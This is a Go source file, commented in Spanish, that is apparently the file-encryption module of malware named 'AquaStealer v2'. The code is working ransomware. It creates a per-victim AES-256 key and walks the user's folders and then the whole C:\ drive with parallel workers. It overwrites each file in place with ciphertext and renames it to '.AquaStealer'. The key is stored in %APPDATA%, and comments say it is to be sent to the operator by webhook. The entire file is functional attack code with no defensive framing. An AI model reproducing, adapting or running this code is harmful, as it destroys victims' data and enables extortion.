package renamer

// renamer.go — AquaStealer v2 — Cifrado AES-256-GCM
//
// Comportamiento:
//   - Genera clave AES-256 única por víctima en runtime (32 bytes random)
//   - Cifra archivos in-place: contenido original sobrescrito con [nonce(12)+ciphertext]
//   - Renombra a .AquaStealer
//   - Guarda la clave cifrada en %APPDATA%\aqua.key (para recuperación si el operador la provee)
//   - Devuelve la clave en hex para enviar por webhook
//
// Formato del archivo cifrado:
//   [4 bytes magic "AQUA"] [12 bytes nonce] [N bytes ciphertext+tag(16)]
//
// Alcance:
//   - Carpetas del usuario: Desktop, Documents, Downloads, Pictures, Videos, Music, OneDrive
//   - Todo el disco C:\ (excluyendo directorios de sistema)
//   - Workers paralelos para velocidad máxima

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

const (
	extension = ".AquaStealer"
	magic     = "AQUA"
)

// skipDirs — NO tocar para no romper Windows
var skipDirs = map[string]bool{
	`c:\windows`:                    true,
	`c:\program files`:              true,
	`c:\program files (x86)`:        true,
	`c:\programdata`:                true,
	`c:\$recycle.bin`:               true,
	`c:\system volume information`:  true,
	`c:\recovery`:                   true,
	`c:\boot`:                       true,
	`c:\perflogs`:                   true,
}

// skipExts — ejecutables y archivos de sistema
var skipExts = map[string]bool{
	".exe": true, ".dll": true, ".sys": true, ".msi": true,
	".bat": true, ".cmd": true, ".ps1": true, ".vbs": true,
	".lnk": true, ".ico": true, ".ini": true, ".inf": true,
	".aquastealer": true,
}

// Result contiene la clave y stats del cifrado
type Result struct {
	KeyHex    string // clave AES-256 en hex (64 chars) — enviar por webhook
	Encrypted int    // archivos cifrados
	Failed    int    // archivos que fallaron
}

// Run genera la clave, cifra todo y devuelve el resultado
func Run() *Result {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil
	}

	keyHex := hex.EncodeToString(key)

	// Persistir clave en disco (operador la usa para descifrar)
	saveKey(keyHex)

	encrypted, failed := encryptAll(key)

	return &Result{
		KeyHex:    keyHex,
		Encrypted: encrypted,
		Failed:    failed,
	}
}

// saveKey guarda la clave en %APPDATA%\aqua.key (oculto)
func saveKey(keyHex string) {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return
	}
	path := filepath.Join(appdata, "aqua.key")
	_ = os.WriteFile(path, []byte(keyHex), 0600)
}

// encryptAll recorre el sistema y cifra
func encryptAll(key []byte) (encrypted, failed int) {
	type result struct {
		ok bool
	}

	fileCh := make(chan string, 4096)
	resCh := make(chan result, 4096)
	var wg sync.WaitGroup

	// Workers
	numWorkers := 16
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for path := range fileCh {
				err := encryptFile(key, path)
				resCh <- result{ok: err == nil}
			}
		}()
	}

	// Colector
	var mu sync.Mutex
	var collWg sync.WaitGroup
	collWg.Add(1)
	go func() {
		defer collWg.Done()
		for r := range resCh {
			mu.Lock()
			if r.ok {
				encrypted++
			} else {
				failed++
			}
			mu.Unlock()
		}
	}()

	// Walker — primero usuario, luego disco completo
	roots := append(getUserPaths(), `C:\`)
	for _, root := range roots {
		filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
			if err != nil {
				return nil
			}
			if d.IsDir() {
				lower := strings.ToLower(path)
				if skipDirs[lower] {
					return filepath.SkipDir
				}
				for skip := range skipDirs {
					if strings.HasPrefix(lower, skip+`\`) {
						return filepath.SkipDir
					}
				}
				return nil
			}
			ext := strings.ToLower(filepath.Ext(path))
			if skipExts[ext] {
				return nil
			}
			if strings.HasSuffix(strings.ToLower(path), strings.ToLower(extension)) {
				return nil
			}
			fileCh <- path
			return nil
		})
	}

	close(fileCh)
	wg.Wait()
	close(resCh)
	collWg.Wait()

	return
}

// encryptFile cifra un archivo in-place con AES-256-GCM
// Formato: [4 magic][12 nonce][ciphertext+tag]
func encryptFile(key []byte, path string) error {
	// Leer contenido original
	plaintext, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// Crear cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	// Generar nonce único por archivo
	nonce := make([]byte, gcm.NonceSize()) // 12 bytes
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	// Cifrar
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)

	// Construir payload: magic + nonce + ciphertext
	payload := make([]byte, 0, 4+len(nonce)+len(ciphertext))
	payload = append(payload, []byte(magic)...)
	payload = append(payload, nonce...)
	payload = append(payload, ciphertext...)

	// Sobrescribir archivo original
	if err := os.WriteFile(path, payload, 0644); err != nil {
		return err
	}

	// Renombrar a .AquaStealer
	origExt := filepath.Ext(path)
	base := strings.TrimSuffix(path, origExt)
	newPath := base + extension

	// Si ya existe el destino, borrarlo
	if _, err := os.Stat(newPath); err == nil {
		os.Remove(newPath)
	}

	return os.Rename(path, newPath)
}

func getUserPaths() []string {
	home := os.Getenv("USERPROFILE")
	onedrive := os.Getenv("OneDrive")
	paths := []string{
		filepath.Join(home, "Desktop"),
		filepath.Join(home, "Documents"),
		filepath.Join(home, "Downloads"),
		filepath.Join(home, "Pictures"),
		filepath.Join(home, "Videos"),
		filepath.Join(home, "Music"),
		filepath.Join(home, "Contacts"),
		filepath.Join(home, "Favorites"),
		filepath.Join(home, "Saved Games"),
	}
	if onedrive != "" {
		paths = append(paths, onedrive)
	}
	return paths
}
